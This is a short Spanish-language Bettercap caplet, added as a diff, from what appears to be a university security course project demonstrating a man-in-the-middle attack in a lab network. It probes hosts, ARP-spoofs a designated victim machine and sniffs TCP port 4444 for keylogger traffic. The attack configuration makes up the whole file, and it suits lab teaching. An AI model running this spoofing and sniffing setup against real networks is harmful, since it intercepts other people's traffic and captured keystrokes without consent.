@@ -1,0 +1,24 @@
+# mitm_demo.cap
+# Caplet de Bettercap para demostración MITM
+# Proyecto U2 - Seguridad Informática
+#
+# Uso (en ParrotMITM 10.0.4.5):
+#   sudo sysctl -w net.ipv4.ip_forward=1
+#   sudo bettercap -iface enp0s3 -caplet mitm_demo.cap
+
+# 1. Descubrir hosts en la red
+net.probe on
+
+# 2. Configurar ARP Spoofing hacia Ubuntu (víctima)
+set arp.spoof.targets 10.0.4.8
+set arp.spoof.fullduplex true
+
+# 3. Activar ARP Spoofing
+arp.spoof on
+
+# 4. Filtrar solo tráfico del keylogger (puerto 4444)
+set net.sniff.filter tcp port 4444
+set net.sniff.verbose true
+
+# 5. Iniciar captura
+net.sniff on
